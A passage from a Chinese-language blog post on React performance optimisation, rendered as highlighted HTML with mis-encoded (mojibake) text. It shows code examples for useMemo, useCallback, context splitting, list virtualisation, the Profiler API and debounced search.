class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é”™è¯¯ç”¨æ³•ï¼šuseMemo ä½œä¸ºè¯­ä¹‰ä¿è¯</span><br><span class="hljs-keyword">const</span> data = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">fetchData</span>(), []); <span class="hljs-comment">// ä¸ä¼šé˜»æ­¢é‡å¤è¯·æ±‚</span><br><br><span class="hljs-comment">// æ­£ç¡®ç”¨æ³•ï¼šä»…ç”¨äºæ€§èƒ½ä¼˜åŒ–</span><br><span class="hljs-keyword">const</span> transformedData = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <br>  rawData.<span class="hljs-title function_">map</span>(transformItem), <br>[rawData]);<br></code></pre></td></tr></table></figure><p><strong>useCallback é«˜çº§ç”¨æ³•</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ParentComponent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-comment">// ç¼“å­˜å‡½æ•°å¼•ç”¨</span><br>  <span class="hljs-keyword">const</span> handleClick = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;ç‚¹å‡»äº‹ä»¶&#x27;</span>, count);<br>    <span class="hljs-comment">// æ³¨æ„ï¼šé—­åŒ…é™·é˜±ï¼count æ˜¯åˆ›å»ºæ—¶çš„å€¼</span><br>  &#125;, [count]); <span class="hljs-comment">// ä¾èµ– count ä¿è¯æœ€æ–°å€¼</span><br>  <br>  <span class="hljs-comment">// ä½¿ç”¨ ref è§£å†³é—­åŒ…é—®é¢˜</span><br>  <span class="hljs-keyword">const</span> countRef = <span class="hljs-title function_">useRef</span>(count);<br>  countRef.<span class="hljs-property">current</span> = count;<br>  <br>  <span class="hljs-keyword">const</span> stableHandler = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;æœ€æ–°å€¼:&#x27;</span>, countRef.<span class="hljs-property">current</span>);<br>  &#125;, []); <span class="hljs-comment">// æ— ä¾èµ–ï¼Œå‡½æ•°å¼•ç”¨ç¨³å®š</span><br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setCount(c =&gt; c + 1)&#125;&gt;å¢åŠ  &#123;count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;stableHandler&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ChildComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">&#123; onClick &#125;</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;å­ç»„ä»¶æ¸²æŸ“&#x27;</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;onClick&#125;</span>&gt;</span>è§¦å‘äº‹ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;);<br></code></pre></td></tr></table></figure><p>å…³é”®ç‰¹æ€§ï¼š</p><ul><li>ç¼“å­˜å‡½æ•°å¼•ç”¨ï¼Œé¿å…å­ç»„ä»¶ä¸å¿…è¦æ¸²æŸ“</li><li>ä¾èµ–é¡¹å˜åŒ–æ—¶åˆ›å»ºæ–°å‡½æ•°</li><li>é€‚ç”¨äºï¼šäº‹ä»¶å¤„ç†å‡½æ•°ã€ä¼ é€’ç»™å­ç»„ä»¶çš„å›è°ƒ</li></ul><p>æœ€ä½³å®è·µï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¾èµ–é¡¹å¤„ç†æŠ€å·§</span><br><span class="hljs-keyword">const</span> handleSubmit = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  api.<span class="hljs-title function_">submitForm</span>(formState);<br>&#125;, [formState]); <span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä¾èµ–å®é™…ä½¿ç”¨çš„çŠ¶æ€</span><br><br><span class="hljs-comment">// ä½¿ç”¨å‡½æ•°å¼æ›´æ–°é¿å…ä¾èµ–</span><br><span class="hljs-keyword">const</span> increment = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>); <span class="hljs-comment">// âœ… ä¸ä¾èµ– count</span><br>&#125;, []);<br></code></pre></td></tr></table></figure><h3 id="ç»¼åˆä¼˜åŒ–ç­–ç•¥"><a href="#ç»¼åˆä¼˜åŒ–ç­–ç•¥" class="headerlink" title="ç»¼åˆä¼˜åŒ–ç­–ç•¥"></a>ç»¼åˆä¼˜åŒ–ç­–ç•¥</h3><p><strong>ç»„ä»¶ç»“æ„ä¼˜åŒ–</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¼˜åŒ–å‰ï¼šçŠ¶æ€æå‡å¯¼è‡´é¢‘ç¹æ¸²æŸ“</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(&#123;&#125;);<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ExpensiveComponent</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;state.data&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ControlPanel</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;setState&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// ä¼˜åŒ–åï¼šçŠ¶æ€ä¸‹æ²‰</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">OptimizedParent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">DataContainer</span>&gt;</span></span><br><span class="language-xml">        &#123;(data) =&gt; <span class="hljs-tag">&lt;<span class="hljs-name">ExpensiveComponent</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span>&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">DataContainer</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ControlPanel</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">DataContainer</span>(<span class="hljs-params">&#123; children &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <span class="hljs-comment">// çŠ¶æ€ç®¡ç†éš”ç¦»åœ¨æ­¤ç»„ä»¶</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">children</span>(data);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¸Šä¸‹æ–‡ä¼˜åŒ–æŠ€å·§</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºæ‹†åˆ†ä¸Šä¸‹æ–‡</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">UserContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">SettingsContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">const</span> [settings, setSettings] = <span class="hljs-title function_">useState</span>(&#123;&#125;);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;user&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">SettingsContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;settings&#125;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">MainContent</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">SettingsContext.Provider</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">UserContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// æ¶ˆè´¹è€…ç»„ä»¶</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">ThemeSwitcher</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-comment">// åªè®¢é˜…éœ€è¦çš„ä¸Šä¸‹æ–‡</span><br>  <span class="hljs-keyword">const</span> settings = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">SettingsContext</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>å½“å‰ä¸»é¢˜: &#123;settings.theme&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨ React.memo é˜²æ­¢ä¸å¿…è¦æ¸²æŸ“</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Header</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserContext</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span>&#123;user ? user.name : &#x27;æ¸¸å®¢&#x27;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span>;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>è™šæ‹ŸåŒ–é•¿åˆ—è¡¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">FixedSizeList</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-window&#x27;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">BigList</span> = (<span class="hljs-params">&#123; items &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">Row</span> = (<span class="hljs-params">&#123; index, style &#125;</span>) =&gt; (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;style&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ListItem</span> <span class="hljs-attr">item</span>=<span class="hljs-string">&#123;items[index]&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FixedSizeList</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">height</span>=<span class="hljs-string">&#123;600&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">width</span>=<span class="hljs-string">&#123;800&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">itemCount</span>=<span class="hljs-string">&#123;items.length&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">itemSize</span>=<span class="hljs-string">&#123;100&#125;</span> // <span class="hljs-attr">æ¯é¡¹é«˜åº¦</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &gt;</span></span><br><span class="language-xml">      &#123;Row&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">FixedSizeList</span>&gt;</span></span><br>  );<br>&#125;;<br><br><span class="hljs-comment">// ä¼˜åŒ–åˆ—è¡¨é¡¹</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ListItem</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">&#123; item &#125;</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;item&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Avatar</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&#123;item.avatar&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>&#123;item.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;item.description&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="æ€§èƒ½åˆ†æå·¥å…·"><a href="#æ€§èƒ½åˆ†æå·¥å…·" class="headerlink" title="æ€§èƒ½åˆ†æå·¥å…·"></a>æ€§èƒ½åˆ†æå·¥å…·</h3><p><strong>React DevTools Profiler</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProfilerTest</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Profiler</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Navigation&quot;</span> <span class="hljs-attr">onRender</span>=<span class="hljs-string">&#123;onRenderCallback&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Navigation</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Profiler</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">onRenderCallback</span>(<span class="hljs-params"></span><br><span class="hljs-params">  id, <span class="hljs-comment">// Profiler æ ‘çš„ &quot;id&quot;</span></span><br><span class="hljs-params">  phase, <span class="hljs-comment">// &quot;mount&quot; æˆ– &quot;update&quot;</span></span><br><span class="hljs-params">  actualDuration, <span class="hljs-comment">// æœ¬æ¬¡æ›´æ–°èŠ±è´¹çš„æ¸²æŸ“æ—¶é—´</span></span><br><span class="hljs-params">  baseDuration, <span class="hljs-comment">// ä¼°è®¡ä¸ä½¿ç”¨ memoization çš„æ¸²æŸ“æ—¶é—´</span></span><br><span class="hljs-params">  startTime, <span class="hljs-comment">// æœ¬æ¬¡æ›´æ–°å¼€å§‹æ—¶é—´</span></span><br><span class="hljs-params">  commitTime, <span class="hljs-comment">// æäº¤æ—¶é—´</span></span><br><span class="hljs-params">  interactions <span class="hljs-comment">// æœ¬æ¬¡æ›´æ–°æ‰€å…³è”çš„ set</span></span><br><span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ç»„ä»¶ <span class="hljs-subst">$&#123;id&#125;</span> çš„ <span class="hljs-subst">$&#123;phase&#125;</span> é˜¶æ®µè€—æ—¶: <span class="hljs-subst">$&#123;actualDuration&#125;</span>ms`</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Chrome Performance Tab</strong></p><ul><li>æ“ä½œæ­¥éª¤ï¼š<ul><li>æ‰“å¼€ Chrome DevTools</li><li>åˆ‡æ¢åˆ° Performance é€‰é¡¹å¡</li><li>ç‚¹å‡» Record å¼€å§‹è®°å½•</li><li>æ‰§è¡Œé¡µé¢æ“ä½œ</li><li>åœæ­¢è®°å½•åˆ†æç«ç„°å›¾</li></ul></li><li>å…³é”®æŒ‡æ ‡ï¼š<ul><li>Scriptingï¼šJavaScript æ‰§è¡Œæ—¶é—´</li><li>Renderingï¼šæ ·å¼è®¡ç®—å’Œå¸ƒå±€</li><li>Paintingï¼šåƒç´ ç»˜åˆ¶æ—¶é—´</li><li>Idleï¼šç©ºé—²æ—¶é—´</li></ul></li></ul><h3 id="å¸¸è§æ€§èƒ½é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ"><a href="#å¸¸è§æ€§èƒ½é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ" class="headerlink" title="å¸¸è§æ€§èƒ½é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ"></a>å¸¸è§æ€§èƒ½é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h3><p><strong>çŠ¶æ€é¢‘ç¹å˜æ›´å¯¼è‡´æ¸²æŸ“æŠ–åŠ¨</strong></p><p>åœºæ™¯ï¼šè¾“å…¥æ¡†å®æ—¶æœç´¢å¯¼è‡´é¢‘ç¹æ¸²æŸ“</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SearchBox</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [inputValue, setInputValue] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <span class="hljs-keyword">const</span> [searchResults, setSearchResults] = <span class="hljs-title function_">useState</span>([]);<br>  <br>  <span class="hljs-comment">// ä½¿ç”¨é˜²æŠ–</span><br>  <span class="hljs-keyword">const</span> debouncedSearch = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <br>    <span class="hljs-title function_">debounce</span>(<span class="hljs-function"><span class="hljs-params">query</span> =&gt;</span> &#123;<br>      api.<span class="hljs-title function_">search</span>(query).<span class="hljs-title function_">then</span>(setSearchResults);<br>    &#125;, <span class="hljs-number">300</span>),<br>  []);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">debouncedSearch</span>(inputValue);<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> debouncedSearch.<span class="hljs-title function_">cancel</span>();<br>  &#125;, [inputValue, debouncedSearch]);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;inputValue&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;e</span> =&gt;</span> setInputValue(e.target.value)&#125;</span><br><span class="language-xml">      /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ResultsList</span> <span class="hljs-attr">results</span>=<span class="hljs-string">&#123;searchResults&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¤æ‚ç»„ä»¶æ ‘æ›´æ–°ç¼“æ…¢</strong></p><p>åœºæ™¯ï¼šå¤§å‹è¡¨å•ç»„ä»¶å±€éƒ¨æ›´æ–°</p><p>è§£å†³æ–¹æ¡ˆï¼šçŠ¶æ€éš”ç¦» + React.memo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">BigForm</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> [formData, setFormData] = <span class="hljs-title function_">useState</span>(initialData);<br>  <br>  <span class="hljs-comment">// çŠ¶æ€æ›´æ–°å‡½æ•°</span><br>  <span class="hljs-keyword">const</span> updateField = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">field, value</span>) =&gt;</span> &#123;<br>    <span class="hljs-title function_">setFormData</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (&#123; ...prev, [field]: value &#125;));<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">PersonalSection</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;formData.personal&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;updateField&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">AddressSection</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;formData.address&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;updateField&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">PaymentSection</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;formData.payment&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;updateField&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br>  );<br>&#125;;<br><br><span class="hljs-comment">// ä¼˜åŒ–å­ç»„ä»¶</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">PersonalSection</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title 